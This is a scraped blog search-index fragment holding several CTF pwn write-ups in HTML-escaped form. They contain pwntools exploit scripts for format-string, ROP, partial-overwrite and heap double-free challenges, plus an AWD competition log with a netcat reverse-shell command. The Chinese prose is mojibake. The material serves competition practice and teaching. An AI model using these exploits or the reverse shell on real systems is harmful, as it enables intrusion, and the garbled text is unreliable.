load_text=0x401493
leak=0x4014ee
ret=0x40101a

io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;file_name : &amp;quot;,b&amp;quot;.&amp;quot;)

io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;file_name : &amp;quot;,b&amp;quot;flag.txt&amp;quot;)


io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;file_content_length : &amp;quot;,b&amp;quot;1&amp;quot;)
io.recvuntil(b&amp;quot;read more \n&amp;quot;)

gdb.attach(io)
pause()

payload=cyclic(0x18)+p64(load_text)+p64(ret)*2+p64(leak)
io.send(payload)

io.sendlineafter(b&amp;quot;file_content_length : &amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">NSSCTF Round#14 Basic. ÈÉ®ÂàÜwp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/XKnqVgyRN1/"" data-c="
          &lt;h4 id=&#34;das-6ÊúàËµõfooooood&#34;&gt;DAS 6ÊúàËµõfoooooodÔºö&lt;/h4&gt;
&lt;p&gt;ÈùûÊ†à‰∏äÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤Ôºå‰ΩÜÊòØÂè™Êúâ3Ê¨°ÊúâÊïàËæìÂÖ•Êú∫‰ºöÔºåÊâæË∑≥Êùø(&lt;code&gt;1-&amp;gt;2-&amp;gt;3-&amp;gt;value&lt;/code&gt;)ÂèØ‰ª•Áî®‰∏§Ê¨°ËæìÂÖ•ÂÜôÊéâÊ†à‰∏ä&lt;code&gt;i&lt;/code&gt;ÁöÑÂÄº‰∏∫‰∏Ä‰∏™Â§ßÂÄº‰ªéËÄåÂÆûÁé∞Â§öÊ¨°ËæìÂÖ•ÔºåÂêéÈù¢Â∞±ÊòØÈùûÊ†à‰∏äÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤Ê†áÂáÜÊâìÊ≥ïÔºåÂä´ÊåÅretÂèØ‰ª•Êâìrop‰πüÂèØ‰ª•Êâìone_gadget&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
# context(log_level=&#39;debug&#39;)

# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25718)
io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def sd(cc):
    io.sendlineafter(b&amp;quot;what&#39;s your favourite food: &amp;quot;, cc)


io.recvuntil(b&amp;quot;Give me your name:&amp;quot;)
payload=b&amp;quot;/bin/sh\x00&amp;quot;
io.sendline(payload)


io.recvuntil(b&amp;quot;what&#39;s your favourite food: &amp;quot;)
payload=&amp;quot;%11$p.%9$p&amp;quot;
io.sendline(payload)

gdb.attach(io)    
pause()

io.recvuntil(b&amp;quot;like &amp;quot;)
stack=int(io.recv(14),16)
stack0=stack-0xd0
ret_addr=stack0-0x10
rr=stack0+0xe0
# canary=int(io.recv(18),16)
io.recvuntil(b&amp;quot;.&amp;quot;)
libc_addr=int(io.recv(14),16)-240-libc.sym[b&amp;quot;__libc_start_main&amp;quot;]
print(&amp;quot;stack: &amp;quot;+hex(stack))
print(&amp;quot;stack0: &amp;quot;+hex(stack0))
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=one_gadget[3]+libc_addr
sys_addr=libc.sym[b&amp;quot;system&amp;quot;]+libc_addr

off0=(stack0-0x24)&amp;amp;0xffff
payload = &amp;quot;%{}c%{}$hn&amp;quot;.format(off0,11)
sd(payload)

sd(&#39;%100&#39;+&#39;c%37$hhn&#39;) #‰øÆÊîπiÂÄºÔºåÂ¢ûÂä†Âæ™ÁéØÊ¨°Êï∞

# off1=(off0+0xc+0x8)
off1=ret_addr

def fmt_off(addr,value):

    payload = &amp;quot;%{}c%{}$hn&amp;quot;.format(addr&amp;amp;0xffff,11)
    sd(payload)

    payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format(value&amp;amp;0xff,37)
    sd(payload)

    for i in range(4):
        payload = &amp;quot;%{}c%{}$hhn&amp;quot;.format((addr+1+i)&amp;amp;0xff,11)
        sd(payload)
        payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format((value&amp;gt;&amp;gt;((i+1)*8))&amp;amp;0xff,37)
        sd(payload)
    
fmt_off(ret_addr,shell) #ÂçïÂ≠óËäÇÂæ™ÁéØÂÜô

for i in range(87):
    io.sendline(b&amp;quot;1&amp;quot;)


io.interactive()
    
# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;swpu_19_login&#34;&gt;SWPU_19_login&lt;/h4&gt;
&lt;p&gt;7/30Â§ç‰π†‰∏Ä‰∏ã&lt;br&gt;
32‰ΩçÔºåÂä´ÊåÅmainÂáΩÊï∞ËøîÂõûÂú∞ÂùÄ‰∏∫one_gadget&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
context(terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28348)
# io=process(&amp;quot;./login&amp;quot;)
elf=ELF(&amp;quot;./login&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

# gdb.attach(io)
# pause()

sh_addr=0x804b080
io.sendafter(b&amp;quot;name: \n&amp;quot;,b&amp;quot;/bin/sh\x00&amp;quot;)
io.recvuntil(b&amp;quot;word: \n&amp;quot;)

# 6 15

payload=b&amp;quot;%6$p.%15$p&amp;quot;
io.send(payload)
io.recvuntil(b&amp;quot;password: &amp;quot;)
stack_addr=int(io.recv(10),16)
io.recvuntil(b&amp;quot;.&amp;quot;)
leak_addr=int(io.recv(10),16)-241-libc.sym[b&amp;quot;__libc_start_main&amp;quot;]
ret_addr=stack_addr+0x24
shell=leak_addr+0x3cbf7

print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
print(&amp;quot;ret_addr: &amp;quot;+hex(ret_addr))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
print(&amp;quot;shell: &amp;quot;+hex(shell))

io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hn&amp;quot;.format(ret_addr&amp;amp;0xffff,22)
io.send(payload)

io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format(shell&amp;amp;0xff,59)
io.send(payload)


io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format((ret_addr+1)&amp;amp;0xff,22)
io.send(payload)

io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format((shell&amp;gt;&amp;gt;8)&amp;amp;0xff,59)
io.send(payload)


io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format((ret_addr+2)&amp;amp;0xff,22)
io.send(payload)

io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format((shell&amp;gt;&amp;gt;16)&amp;amp;0xff,59)
io.send(payload)


io.recvuntil(b&amp;quot;again!\n&amp;quot;)
io.send(b&amp;quot;wllmmllw&amp;quot;)

io.interactive()

# 0x3cbea execve(&amp;quot;/bin/sh&amp;quot;, esp+0x34, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x34] == NULL

# 0x3cbec execve(&amp;quot;/bin/sh&amp;quot;, esp+0x38, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x38] == NULL

# 0x3cbf0 execve(&amp;quot;/bin/sh&amp;quot;, esp+0x3c, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x3c] == NULL

# 0x3cbf7 execve(&amp;quot;/bin/sh&amp;quot;, esp+0x40, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x40] == NULL

# 0x6729f execl(&amp;quot;/bin/sh&amp;quot;, eax)
# constraints:
#   esi is the GOT address of libc
#   eax == NULL

# 0x672a0 execl(&amp;quot;/bin/sh&amp;quot;, [esp])
# constraints:
#   esi is the GOT address of libc
#   [esp] == NULL

# 0x13573e execl(&amp;quot;/bin/sh&amp;quot;, eax)
# constraints:
#   ebx is the GOT address of libc
#   eax == NULL

# 0x13573f execl(&amp;quot;/bin/sh&amp;quot;, [esp])
# constraints:
#   ebx is the GOT address of libc
#   [esp] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;osu_miss_analyzer&#34;&gt;osu_miss_analyzer&lt;/h4&gt;
&lt;p&gt;oggÊâì‰∏çÈÄöÊÄé‰πàÂäûÔºåÊ†à‰∏äÂ∏ÉÁΩÆropÈìæÔºåËøôÈÅìÈ¢òÂç°ËæìÂÖ•Êå∫ÊÅ∂ÂøÉÁöÑ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&#39;./analyzer&#39;)
io=remote(&amp;quot;chal.osugaming.lol&amp;quot;,7273)
elf=ELF(&#39;./analyzer&#39;)
libc=elf.libc

# gdb.attach(io,&#39;b *0x4018d9\nc\n&#39;)
# pause()

def fi(s,n):
    payload =  b&amp;quot;\x00\xFB\xD6\x34\x01\x0B\x20\x32\x65\x61\x37\x32\x32\x31\x38\x65&amp;quot;
    payload += b&amp;quot;\x35\x36\x38\x30\x66\x33\x62\x63\x31\x65\x32\x39\x36\x66\x63\x64&amp;quot;
    payload += b&amp;quot;\x62\x37\x36\x33\x32\x39\x36\x0B&amp;quot;
    payload += &#39;{}{}&#39;.format(s,n).encode()
    payload += b&amp;quot;\x0B\x20\x66\x63\x36\x64\x63\x33\x64\x61\x62\x65\x30\x64\x63\x34&amp;quot;
    payload += b&amp;quot;\x65\x30\x35\x62\x33\x64\x65\x63\x32\x33\x39\x36\x64\x31\x30\x34&amp;quot;
    payload += b&amp;quot;\x32\x33\xDF\x02\x06\x00\x00\x00\xC0\x00\x05\x00\x00\x00\x32\x35&amp;quot;
    payload += b&amp;quot;\x3A\x01\x4C\x04\x01\x28\x00\x00\x00\x0b&amp;quot;
    return payload

payload=fi(&#39;\x05&#39;,&#39;%51$p&#39;)
io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())

io.recvuntil(b&amp;quot;name: &amp;quot;)
leak_addr=int(io.recv(14),16)-0x29d90
log.success(&amp;quot;leak_addr:&amp;quot;+hex(leak_addr))

shell=leak_addr+0xebc81
log.success(&amp;quot;shell:&amp;quot;+hex(shell))

pop_rdi=leak_addr+0x000000000002a3e5
ret=leak_addr+0x0000000000029139
leave_ret=leak_addr+0x000000000004da83
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

bss_addr=0x404400

def ab_write(content,addr):
    for i in range(6):
        tp=&#39;%{}c%16$hhn&#39;.format((content&amp;gt;&amp;gt;(8*i))&amp;amp;0xff).ljust(0x10,&#39;a&#39;)+p64(addr+i).decode(&#39;latin-1&#39;)
        slen=len(tp)
        log.success(&amp;quot;slen:&amp;quot;+hex(slen))
        payload=fi(&#39;\x18&#39;,tp)
        io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())

# ab_write(shell,0x404070)
# ab_write(pop_rdi,bss_addr)
# ab_write(str_sh,bss_addr+8)
# ab_write(sys_addr,bss_addr+16)

## leak stack
payload=fi(&#39;\x04&#39;,&#39;%6$p&#39;)
io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())
io.recvuntil(b&amp;quot;name: &amp;quot;)
stack_addr=int(io.recv(14),16)
log.success(&amp;quot;stack_addr:&amp;quot;+hex(stack_addr))
ret_addr=stack_addr-0x110


# gdb.attach(io,&#39;b *0x401686\nc&#39;)
# pause()

ab_write(pop_rdi,bss_addr)
ab_write(str_sh,bss_addr+0x8)
ab_write(sys_addr,bss_addr+0x10)

# gdb.attach(io,&#39;&#39;)
# pause()

def fmt_t(addr,ctt,off1,off2):
    tp=&amp;quot;%{}c%{}$hn&amp;quot;.format(addr&amp;amp;0xffff,off1).ljust(0x20,&#39;a&#39;)
    slen=len(tp)
    log.success(&amp;quot;slen:&amp;quot;+hex(slen))
    payload=fi(&#39;\x20&#39;,tp)
    io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())
      
    for i in range(6):
        tp=&amp;quot;%{}c%{}$hhn&amp;quot;.format((addr+i)&amp;amp;0xff,off1).ljust(0x20,&#39;a&#39;)
        slen=len(tp)
        log.success(&amp;quot;slen:&amp;quot;+hex(slen))
        payload=fi(&#39;\x20&#39;,tp)
        io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())
        
        tp1=&amp;quot;%{}c%{}$hhn&amp;quot;.format((ctt&amp;gt;&amp;gt;((i)*8))&amp;amp;0xff,off2).ljust(0x20,&#39;a&#39;)
        slen=len(tp1)
        log.success(&amp;quot;slen:&amp;quot;+hex(slen))
        payload=fi(&#39;\x20&#39;,tp1)
        io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())
        

# def fmt_t(addr,ctt,off1,off2):
#     io.sendafter(b&amp;quot;:\n&amp;quot;,&amp;quot;%{}c%{}$hn&amp;quot;.format(addr&amp;amp;0xffff,off1).hex())
#     io.sendafter(b&amp;quot;:\n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format(ctt&amp;amp;0xff,off2).hex())
    
#     for i in range(5):
#         io.sendafter(b&amp;quot;:\n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format((addr+i+1)&amp;amp;0xff,off1))
#         io.sendafter(b&amp;quot;:\n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format((ctt&amp;gt;&amp;gt;((i+1)*8))&amp;amp;0xff,off2))


fmt_t(ret_addr+0x8,pop_rdi,6,85)
fmt_t(ret_addr+0x10,str_sh,6,85)
fmt_t(ret_addr+0x18,sys_addr,6,85)
fmt_t(ret_addr,ret,6,85)

log.success(&amp;quot;stack_addr:&amp;quot;+hex(stack_addr))
log.success(&amp;quot;ret_addr:&amp;quot;+hex(ret_addr))
log.success(&amp;quot;str_sh:&amp;quot;+hex(str_sh))
log.success(&amp;quot;pop_rdi:&amp;quot;+hex(pop_rdi))

io.sendlineafter(b&amp;quot;:\n&amp;quot;,b&amp;quot;ls&amp;quot;)
io.sendline(b&amp;quot;cat flag.txt&amp;quot;)

io.interactive()


# 0xebc81 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL || r10 is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

# 0xebc85 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL || r10 is a valid argv
#   [rdx] == NULL || rdx == NULL || rdx is a valid envp

# 0xebc88 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL || rsi is a valid argv
#   [rdx] == NULL || rdx == NULL || rdx is a valid envp

# 0xebce2 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   r13 == NULL || {&amp;quot;/bin/sh&amp;quot;, r13, NULL} is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp

# 0xebd38 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   r12 == NULL || {&amp;quot;/bin/sh&amp;quot;, r12, NULL} is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

# 0xebd3f execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   rax == NULL || {rax, r12, NULL} is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

# 0xebd43 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;Pasted%20image%2020240304013446.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">ÈùûÊ†à‰∏äÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ ‰æãÈ¢ò</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/zoxorWZV-/"" data-c="
          &lt;p&gt;bugku‰∏äÊâì‰∫Ü‰∏§Âú∫awdÔºåÁÆÄÂçïËÆ∞ÂΩï‰∏Ä‰∏ã&lt;br&gt;
winscpËøû‰∏äÊñπ‰æøÊñá‰ª∂Êìç‰ΩúÔºåtabbyÂÜçÂºÄ‰∏™ssh&lt;/p&gt;
&lt;p&gt;Aoiawd‰∏äÊé¢ÈíàÔºåÂ∞ÜÊú¨Êú∫tmpÊñá‰ª∂Â§πÈáåÈù¢Êé¢ÈíàÊâîÂà∞Èù∂Êú∫‰∏äÁÑ∂ÂêéÊâßË°åÊåá‰ª§&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chmod +x tapeworm.phar
chmod +x roundworm
chmod +x guardian.phar
./tapeworm.phar -d ÁõÆÂΩï -s ip:port
./roundworm  -w ÁõÆÂΩï -s ip -p port
./guardian.phar -i ÁõÆÂΩï -s ip:port
ÈÄöÂ∏∏
./tapeworm.phar -d ../var/www/html -s ip:port
./roundworm  -w ../var/www/html -s ip -p port
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;dockerÈáåÈù¢ÊûÑÂª∫ÁöÑAoiawdÁöÑguardianÁî®Ëµ∑Êù•ÊúâÁÇπÈóÆÈ¢òÔºå‰∏ÄËà¨ÊÉÖÂÜµevilPatcherËÉΩÂ∫î‰ªò‰∏Ä‰∏ã&lt;br&gt;
Êê≠Âª∫Â•ΩÂêéÂèØ‰ª•ÁúãËÆ∞ÂΩïÔºåÂèØ‰ª•Á≤óÁï•Âà§Êñ≠Âç±Èô©Â§Ñ&lt;/p&gt;
&lt;p&gt;‰∏ªÊú∫ÂºÄÂêØÁ´ØÂè£ÁõëÂê¨Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -lvvp 2333
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Èù∂Êú∫ÂèçÂºπshellÔºåÂ∑≤ÁªèÊãøÈÅìËøúÁ´Øshell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc ‰∏ªÊú∫ip 2333 -e /bin/bash
&lt;/code&gt;&lt;/pre&gt;
">AWDËÆ∞ÂΩï</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/MZwpgRHj1/"" data-c="
          &lt;h3 id=&#34;easy_stack&#34;&gt;easy_stack:&lt;/h3&gt;
&lt;p&gt;partial write+one_gadget&lt;br&gt;
ÈáçÊñ∞ÊâìÂåÖËøáÁöÑlibcÔºåÊú¨Âú∞patch‰∏ç‰∫Ü&lt;br&gt;
Êú¨Âú∞‰∏çpatchË∞ÉËØïÂêéÂèëÁé∞&lt;code&gt;rsp+0x18&lt;/code&gt;‰∏∫mainÂáΩÊï∞Âú∞ÂùÄ&lt;br&gt;
ÂèØ‰ª•‰øÆÊîπmainÂáΩÊï∞ËøîÂõûÂú∞ÂùÄ‰Ωé1Â≠óËäÇ‰∏∫&lt;code&gt;\x80&lt;/code&gt;&lt;br&gt;
‰ΩøÂÖ∂Ë∑≥ËΩ¨Âà∞gadget&lt;br&gt;
&lt;code&gt;mov rax, qword ptr [rsp + 0x18]; call rax;&lt;/code&gt;&lt;br&gt;
ÂèØ‰ª•ÂÜçÊ¨°ËøîÂõûmainÔºåÂêåÊó∂ÂèØ‰ª•Ê≥ÑÈú≤libcÂú∞ÂùÄ&lt;br&gt;
ÊúÄÂêéÊâìone_gadgetÂç≥ÂèØ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./easy_stack&amp;quot;)
io=remote(&amp;quot;nc.eonew.cn&amp;quot;,10004)
elf=ELF(&amp;quot;./easy_stack&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)
# gdb.attach(io)
# pause()

payload=cyclic(0x88)+b&amp;quot;\x80&amp;quot;
io.sendline(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x21a80
print(&amp;quot;leak_addr: &amp;quot; + hex(leak_addr))

shell=leak_addr+0x415a6

payload=b&amp;quot;a&amp;quot;*0x88+p64(shell)
io.sendline(payload)

sleep(1)

io.interactive()
    
# 0x415a6 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x415fa execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xdfa51 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL
&lt;/code&gt;&lt;/pre&gt;
">xm_pwnËÆ∞ÂΩï</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/6yuwf6aET/"" data-c="
          &lt;p&gt;ÊúÄËøëÁ¢∞Âà∞Âá†ÈÅìÊï¥ÂûãÊ∫¢Âá∫ÁöÑÈ¢òÁõÆ&lt;br&gt;
Ê≠§È¢ò2.34-3ÁöÑglibcÁâàÊú¨ÔºåÂ∏∏Áî®hookÂ∑≤Ë¢´Âà†Èô§&lt;br&gt;
Ê≤°ÊúâeditÂáΩÊï∞Ôºå‰ΩÜÊòØÁôΩÁªôuaf&lt;br&gt;
Ê≠§È¢òÂ≠òÂú®Êï¥ÂûãÊ∫¢Âá∫ÂèØ‰ª•ÂàÜÈÖçÂ†ÜÂùóÂà∞‰ªªÊÑèÂú∞ÂùÄÔºåÁ™ÅÁ†¥idxÈôêÂà∂ÔºåÂèØ‰ª•‰ªªÊÑèÂú∞ÂùÄÊ≥ÑÈú≤&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690368381255.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÈÅóÊÜæÁöÑÊòØÊ≠§È¢òÂú®Êú¨Êú∫Â§çÁé∞Êó∂showÊâìÂç∞main_arenaÊåáÈíàÊ≥ÑÈú≤libcÂ§±Ë¥•ÔºåÂç≥‰ΩøÊòØÂÖ∂‰ªñÂ§ß‰Ω¨wpÁöÑÂÅèÁßª‰πüÊòØÔºåÂè™ËÉΩÊâìÈÄöËøúÁ´Ø&lt;br&gt;
2.34ÁöÑÁ¨¶Âè∑Ë°®‰πüÊå∫ÈöæÊâæÁöÑÔºå‰∏ÄÊ≠•‰∏ÄÊ≠•‰∏ãÂéªÊâæÁöÑ&lt;code&gt;exit_hook&lt;/code&gt;ÂÅèÁßª&lt;br&gt;
&lt;code&gt;exit_hook&lt;/code&gt;Âç≥Êåá&lt;code&gt;_rtld_global._rtld_lock_recursive-&amp;gt;_rtld_global._rtld_unlock_recursive&lt;/code&gt;&lt;br&gt;
ÈáäÊîæ7‰∏™Âà∞tcachebinÈáåÈù¢ÔºåÂú®ÈáäÊîæ2‰∏™Â†ÜÂùóÂà∞fastbin&lt;br&gt;
ÂèØ‰ª•Êâìdouble freeÂä´ÊåÅ&lt;code&gt;exit_hook&lt;/code&gt;‰∏∫one_gadget&lt;br&gt;
ÊúÄÂêéË∞ÉÁî®exitÂáΩÊï∞Âç≥ÂèØgetshell&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./newest_note&amp;quot;)
# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28331)
elf=ELF(&amp;quot;./newest_note&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

io.sendlineafter(b&amp;quot;will be? :&amp;quot;,str(0x40040000))

def add(n,cc):
    io.sendlineafter(b&amp;quot;: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

gdb.attach(io)
pause()

show(539034)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x218cc0
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
shell=leak_addr+0xeeccc
exit_hook=leak_addr+0x21a6c0


add(0,b&amp;quot;a&amp;quot;)
delete(0)
show(0)
io.recvuntil(b&amp;quot;Content: &amp;quot;)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr: &amp;quot;,hex(heap_addr))
print(&amp;quot;key: &amp;quot;+hex(key))

for i in range(9):
    add(i,b&amp;quot;a&amp;quot;)

add(9,b&amp;quot;a&amp;quot;)

for i in range(7):
    delete(i)
    
delete(7)
delete(8)
delete(7)

for i in range(7):
    add(i,b&amp;quot;a&amp;quot;)

add(7,p64(key^exit_hook))
add(8,b&amp;quot;a&amp;quot;)
add(7,b&amp;quot;a&amp;quot;)
add(10,p64(shell)*2)

io.sendlineafter(b&amp;quot;: &amp;quot;,b&amp;quot;4&amp;quot;)

io.interactive()


# 0xeeccc execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xeeccf execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xeecd2 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
">[CISCN 2022 ÂàùËµõ]newest_note wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/4UNuWjKnk/"" data-c="
          &lt;p&gt;ËøôÂá†Â§©ÊØîËµõÂ§öÔºå‰∏ÄÂ§ßÂ†ÜÈ¢òÁõÆÁ≠âÁùÄÂ§çÁé∞ÔºåÂÖàÊääËøôÈÅìÂâçÈòµÂ≠êÂÅöÁöÑÈ¢òË°•‰∫Ü&lt;br&gt;
2.27ÁöÑËèúÂçïÈ¢òÔºåÊºèÊ¥ûÂú®deleteÂáΩÊï∞ÈáåÈù¢&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690136049178.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
